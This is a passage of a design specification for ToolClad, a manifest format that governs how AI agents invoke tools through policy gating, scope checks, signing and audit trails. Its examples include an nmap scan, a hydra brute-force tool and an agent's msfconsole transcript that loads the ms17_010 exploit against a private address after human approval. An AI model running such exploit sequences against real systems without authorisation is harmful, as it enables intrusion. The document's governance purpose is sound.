- Vault/OpenBao secrets injection for HTTP headers, browser auth flows, and MCP server credentials
- Evidence chain with SHA-256 hashing, screenshot capture, and cryptographic audit trail
- MCP schema auto-generation from manifests (inputSchema + outputSchema)
- DSL tool reference resolution
- Runtime auto-discovery and hot-reload of manifests (dev mode only)

### Ecosystem Value

Tool vendors and security teams publish `.clad.toml` manifests alongside their CLI tools. Agent frameworks consume them. Any runtime that supports the ToolClad format can safely invoke the tool. Symbiont's implementation is the most complete, with Cedar gating, ORGA enforcement, and cryptographic audit, but a minimal executor that just does argument validation and template interpolation is useful on its own.

A tool distribution includes:

- The binary or installation instructions
- A `.clad.toml` manifest (behavioral contract)
- A SchemaPin signature in `.well-known/schemapin.json` (cryptographic identity over the manifest)

The vendor signs the manifest once with `schemapin-sign`. Consumers verify it with SchemaPin's existing TOFU pinning. No per-manifest configuration on either side. The manifest defines what the tool is and how to invoke it safely; SchemaPin proves it has not been tampered with.

---

## CLI Support

### `symbi tools list`

Lists all discovered tools with their source:

```
TOOL                SOURCE              RISK     CEDAR RESOURCE
nmap_scan           tools/nmap_scan     low      PenTest::ScanTarget
hydra_bruteforce    tools/hydra         high     PenTest::ScanTarget
custom_scanner      src/custom.rs       -        Custom::Scanner
mcp_tool            mcp://server/tool   -        (external)
```

### `symbi tools validate`

Validates all `.clad.toml` files in `tools/`:

```
tools/nmap_scan.clad.toml         OK
tools/hydra_bruteforce.clad.toml  OK
tools/broken_tool.clad.toml       ERROR: unknown type "target_ip" (did you mean "ip_address"?)
```

### `symbi tools test <name>`

Dry-run a tool invocation: validates arguments and shows the constructed command without executing:

```
$ symbi tools test nmap_scan --target 10.0.1.0/24 --scan_type service

  Manifest:  tools/nmap_scan.clad.toml
  Arguments: target=10.0.1.0/24 (scope_target: OK) scan_type=service (enum: OK)
  Command:   nmap -sT -sV --version-intensity 5 --max-rate 1000 -oX /evidence/...-nmap/scan.xml --no-stylesheet -v  10.0.1.0/24
  Cedar:     PenTest::ScanTarget / execute_tool
  Timeout:   600s

  [dry run -- command not executed]
```

### `symbi tools init <name>`

Scaffolds a new `.clad.toml` from a template:

```
$ symbi tools init my_scanner
Created tools/my_scanner.clad.toml -- edit to define your tool interface.
```

### `symbi tools schema <name>`

Outputs the auto-generated MCP JSON Schema for a tool:

```
$ symbi tools schema nmap_scan
{
  "name": "nmap_scan",
  "description": "Network port scanning and service detection",
  "inputSchema": { ... },
  "outputSchema": { ... }
}
```

### `symbi tools sessions`

Lists active session-mode tool sessions:

```
$ symbi tools sessions
SESSION                              TOOL                  AGENT         STATE           INTERACTIONS  UPTIME
a1b2c3d4-5678-...                    msfconsole_session    exploit       module_loaded   7             4m 23s
e5f6a7b8-9012-...                    psql_session          data_agent    ready           12            1m 05s
```

### `symbi tools session <id> transcript`

Dumps the full session transcript with timestamps and policy decisions:

```
$ symbi tools session a1b2c3d4 transcript
[00:00.0] STARTUP  msfconsole -q -x 'color false'
[00:03.2] READY    prompt="msf6 >" state=ready
[00:03.5] INPUT    "use exploit/windows/smb/ms17_010"  cedar=ALLOW  pattern=use_module
[00:04.1] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=module_loaded
[00:04.3] INPUT    "set RHOSTS 10.0.1.5"  cedar=ALLOW  scope=OK  pattern=set_target
[00:04.8] OUTPUT   prompt="msf6 exploit(ms17_010) >" state=configured
[00:05.0] INPUT    "run"  cedar=PENDING_APPROVAL  pattern=run
[00:47.2] APPROVAL human=jascha  cedar=ALLOW
[00:47.3] INPUT    "run"  cedar=ALLOW  pattern=run
...
```

---

## SchemaPin Integration

SchemaPin signs `.clad.toml` files directly as first-class artifacts. No per-manifest configuration is needed.

A ToolClad manifest *is* a tool schema. It is the most complete tool schema that exists, because it defines not just the input/output interface but the behavioral contract: validation rules, command templates, scope constraints, session commands, output parsers. SchemaPin's existing infrastructure handles it with zero changes to the manifest format.

**Signing (tool vendor):**

```bash
schemapin-sign tools/nmap_scan.clad.toml
```

The signature and hash are published in the vendor's existing `.well-known/schemapin.json` discovery document alongside the tool name. No `[tool.schemapin]` section in the manifest. The manifest stays clean.

**Verification (runtime):**

1. Runtime loads `nmap_scan.clad.toml` from `tools/`
2. Runtime hashes the manifest content (SHA-256)
3. Runtime looks up the tool's provider domain (from `toolclad.toml` or `symbiont.toml`)
4. Runtime fetches `.well-known/schemapin.json` from the provider domain
5. Runtime verifies the hash against the published signature using SchemaPin's existing TOFU pinning
6. If verification fails, the manifest is rejected and the tool is not registered

**What this protects:** The signature covers the *entire behavioral contract*. If someone tampers with a command template, a validation rule, a scope constraint, an output schema, or a session command pattern, the hash changes and verification fails. This is strictly stronger than signing only the MCP JSON Schema, because the JSON Schema does not capture execution behavior.

**The trust chain:**

```
SchemaPin verifies the manifest has not been modified
  -> The manifest constrains what the tool can accept
    -> Cedar authorizes whether this invocation is allowed
      -> The executor constructs and runs the command
        -> Each layer trusts the one before it
```

---

## Design Decisions (Resolved)

### Output schema declaration is mandatory

If the manifest generates the MCP `inputSchema`, it must also generate the `outputSchema`. The LLM needs to know what shape of data it will get back to reason effectively *before* execution. This is not optional metadata. It is part of the behavioral contract.

The `[output.schema]` section declares the expected structure of parsed results. The executor validates parser output against this schema and rejects malformed results before they reach the agent. See the Output Handling section for the full specification.

### Hot reload is restricted to development environments

In production, tool contracts changing out from under an active agent loop introduces unpredictable state and security risks. An agent mid-ORGA-loop that suddenly gets a different parameter schema or output format has no way to recover gracefully.

- **Development mode** (`symbiont.toml: mode = "development"`): The runtime watches `tools/` for changes and reloads manifests. Useful for iterating on tool definitions.
- **Production mode**: Manifests are loaded at startup and frozen. Changes require a restart. This is the same contract as Cedar policies, which are also frozen at startup in production.

### Remote manifests are local-only in v1

Fetching `.clad.toml` files from URLs introduces a massive supply chain vulnerability. A compromised manifest server could silently alter parameter validation rules, widen scope constraints, or change command templates. SchemaPin signing mitigates this in theory, but the attack surface is too large for v1.

- **v1**: Local files only. Manifests live in `tools/` and are checked into version control.
- **Future (v2+)**: Remote fetching with mandatory SchemaPin signature verification. The runtime rejects any remote manifest that fails signature check. Discovery could use `.well-known/toolclad/` convention, mirroring SchemaPin's `.well-known/schemapin/`.

### Manifest versioning tracks CLI tool version

The `[tool].version` field tracks the underlying CLI tool version, not the manifest format version. When the manifest changes fundamentally (parameter removed, enum value dropped, output schema restructured), in-flight calls against the old schema are rejected to avoid corrupted state. The runtime compares the loaded manifest version against the version at the time the agent's ORGA loop started. If they diverge (possible only in dev mode with hot reload), the call fails with a clear error directing the agent to re-plan.

Non-breaking changes (new optional parameter with a default, new enum value added) do not trigger rejection.

## Design Principle: Keep Conditionals Simple

The `[command.conditionals]` syntax handles the common case of "include this flag when this parameter is set." It is deliberately not Turing-complete. Tools with deeply nested, mutually exclusive flag dependencies (nmap's full flag matrix, impacket's sub-tool dispatch, metasploit's module/payload/option combinations) will outgrow what TOML conditionals can express cleanly.

**The escape hatch is the intended solution for complex tools.** When you find yourself building elaborate conditional chains in TOML, that is the signal to use `command.executor` and write a focused wrapper script. The wrapper only handles command construction; ToolClad still provides parameter validation, scope enforcement, timeout, evidence capture, and the output envelope.

The 80/20 split from symbi-redteam confirms this: ~14 of 19 tools are pure template tools, ~3 use simple conditionals, and ~2 need escape hatches. If a project has more than 20-30% of tools using escape hatches, the tools themselves are probably complex enough to justify custom wrappers, and ToolClad's value shifts from "eliminate wrappers" to "standardize the contract around them."

## Remaining Open Questions

1. **OAuth redirect flows**: Browser auth flows currently handle direct login forms (username/password/TOTP). OAuth flows where the browser follows a redirect chain through a third-party IdP (Google, Okta, Auth0) require tracking navigation across multiple domains, each with its own scope rules. The `[browser.auth_flows]` architecture supports this in principle (the executor controls the browser and can follow redirects), but the scope enforcement rules need refinement: the auth flow must temporarily allow navigation to the IdP domain during login, then re-lock scope afterward.

2. **GraphQL-specific features**: The `[http]` backend handles GraphQL as a POST request with a JSON body, but GraphQL queries have structure (operations, variables, fragments) that could benefit from deeper validation. A `[graphql]` section extending `[http]` with query parsing and variable typing may be warranted if GraphQL API tools become a significant use case.

3. **Multi-level nested sessions**: The nested session architecture specifies single-level nesting (parent spawns child). Recursive nesting (child spawns grandchild, e.g., msfconsole opens meterpreter which pivots to a second host's shell) needs the same architecture applied recursively. The evidence chain and policy inheritance model scale to arbitrary depth, but the implementation complexity and testing surface increase significantly.

4. **Event-triggered ORGA loops**: The event queue architecture delivers unsolicited events to the agent's Observe phase when the loop is already running. A stronger model would allow critical events (security alerts, session termination, authentication expiry) to *trigger* a new ORGA iteration even when the agent is idle. This requires integration with Symbiont's cron/webhook infrastructure and is deferred to post-v1.

---

## Changelog

### v0.5.3 (2026-04-03)

- **`exec` array format**: Added `exec = ["cmd", "arg1", "{placeholder}"]` as preferred command construction form. Maps directly to `execve`/`os.exec` without shell interpretation or string splitting. Values with spaces/quotes are safe. All four implementations updated. Legacy `template` string form remains supported.
- **Conditionals eval() ban**: Spec now explicitly requires closed-vocabulary parser for `[command.conditionals]`. Implementations MUST NOT use `eval()`, `Function()`, `exec()`, or dynamic code execution. All reference implementations already enforce this.
- **Evidence envelope: exit_code + stderr**: `exit_code` (integer) and `stderr` (string) are now mandatory fields in the evidence envelope. Enables LLM agent self-correction on tool failures. All reference implementations already include these fields.
- **Scope validation consistency**: Added cross-language scope validation test vectors (`tests/scope_vectors.json`) and documented centralization path (Wasm/gRPC) for production deployments where four independent validators are unacceptable.
- **Process group kill semantics**: Documented requirement to spawn tools in new process groups (PGID) and kill the entire group on timeout. Prevents zombie process accumulation. All reference implementations already enforce this.
- **Go quote-aware splitter**: Replaced `strings.Fields()` with a quote-aware `shellSplit()` for template string splitting, fixing breakage when mapped values contain spaces.

### v0.5.2 (2026-03-22)

- HTTP body JSON-escaping for injection safety in body templates
- Platform-aware evidence directories (OS-appropriate temp dirs)
- HTTP error semantics: 4xx maps to `client_error`, 5xx to `server_error`
- Real timeout enforcement with process group kill across all implementations
- Rich MCP schema generation with format/pattern constraints
- `[command]` section is now optional for HTTP-only and MCP-only manifests
- Custom types via `toolclad.toml` with `load_custom_types` and `validate_arg_with_custom_types` APIs
- Full feature parity across Rust, Python, JavaScript, and Go implementations
- All 14 built-in types fully implemented (no stubs)
- All 5 output parsers (json, jsonl, csv, xml, text) fully implemented

### v0.5.1 (2026-03-21)

- Adopted CDP-direct as primary browser backend (direct WebSocket to Chrome debug port, persistent daemon per tab, no Puppeteer/Playwright overhead). Playwright remains as optional convenience layer.
- Added two browser connection modes: `connect = "launch"` (spawn headless) and `connect = "live"` (attach to user's running Chrome session with logged-in tabs). Inspired by [chrome-cdp](https://github.com/pasky/chrome-cdp-skill) architecture.
- Changed default content extraction to accessibility tree (`extract_mode = "accessibility_tree"`). Compact semantic representation is dramatically more token-efficient for LLM consumption than raw HTML.
- Added `snapshot` command (accessibility tree with optional CSS selector scoping), `list_tabs` command (tab discovery for live mode), `extract_html` command (scoped raw HTML when needed), and `network_timing` command (resource timing data).
- Added live browser manifest variant (`chrome_live.clad.toml`) showing live attachment configuration.
- Updated browser applications table with live browser use cases (developer assistant, internal tool automation, debugging/monitoring).
- Explicitly excluded coordinate-based clicking (`clickxy`), raw CDP passthrough (`evalraw`), and GUI-level automation in "Out of Scope by Design" with rationale.

### v0.5.0 (2026-03-21)

- Added HTTP backend (`[http]` section) for REST/GraphQL API tools as oneshot execution backend. Includes request template construction, secrets injection via `{_secret:name}` syntax, status code validation.
- Added MCP proxy backend (`[mcp]` section) for governed passthrough to existing MCP server tools. Includes field mapping, stricter-than-upstream validation, and Cedar policy gating.
- Added Nested Sessions architectural specification: dynamic child session registration, manifest-declared detection patterns, policy inheritance, evidence chain linking. v1 supports single-level nesting.
- Added Unsolicited Output architectural specification: bounded event queue per session, Cedar-based event filtering, Observe phase drain integration. Covers both PTY polling and CDP event listeners.
- Added Browser Authentication Flows architectural specification: auth flow declaration in manifests, Vault/OpenBao credential injection, TOTP support, success validation. LLM never sees credentials.
- Closed TUI tools as out of scope by design with rationale (agentic equivalents are oneshot manifests over underlying data sources).
- Updated mode/backend table to show five backends (shell, HTTP, MCP proxy, PTY, CDP/Playwright) across three modes.
- Updated open protocol scope to include HTTP, MCP proxy, event queue, secrets reference, auth flow, and nested session formats.
- Remaining open questions narrowed to: OAuth redirect flows, GraphQL-specific features, multi-level nested sessions, event-triggered ORGA loops.

### v0.4.0 (2026-03-20)

- Added Browser Mode as third execution backend (BrowserExecutor, CDP/Playwright, URL scope enforcement with redirect interception, page state inference, screenshot evidence)
- Refactored "Session Mode" section into "Stateful Sessions: CLI and Browser" with shared governance layer and transport-specific backends
- Added browser manifest example with `[browser]`, `[browser.scope]`, `[browser.commands]`, and `[browser.state]` sections
- Added browser-specific Cedar policy examples (domain scope, form submission gating, JS execution gating, rate limiting)
- Added browser scope enforcement details (navigation, redirect interception, link click validation)
- Added browser applications table (web testing, competitive intelligence, form filling, scraping, authenticated workflows)
- Simplified SchemaPin integration: removed `[tool.schemapin]` manifest section entirely. SchemaPin signs `.clad.toml` files directly as first-class artifacts using existing `.well-known/schemapin.json` discovery. Zero per-manifest configuration needed.
- Updated security model with browser agent governance comparison
- Updated open protocol scope to include BrowserExecutor and browser-specific components
- Added remaining open questions for HTTP API backends, MCP passthrough, and browser authentication flows

### v0.3.0 (2026-03-20)

- Added Session Mode for interactive CLI tools (per-interaction ORGA gating, session commands as typed MCP tools, prompt-based state inference, SessionExecutor architecture)
- Made output schema (`[output.schema]`) mandatory; generates MCP `outputSchema` alongside `inputSchema`
- Resolved hot reload (dev-only), remote manifests (local-only v1), manifest versioning (tracks CLI tool version), and output schema from open questions
- Added design principle on conditional complexity with escape hatch guidance
- Expanded remaining open questions to cover TUI tools, nested sessions, and unsolicited output

### v0.2.0 (2026-03-20)

- Initial design document with oneshot execution model, type system, command construction, output handling, Symbiont integration, migration path, open protocol scope, CLI support, and SchemaPin integration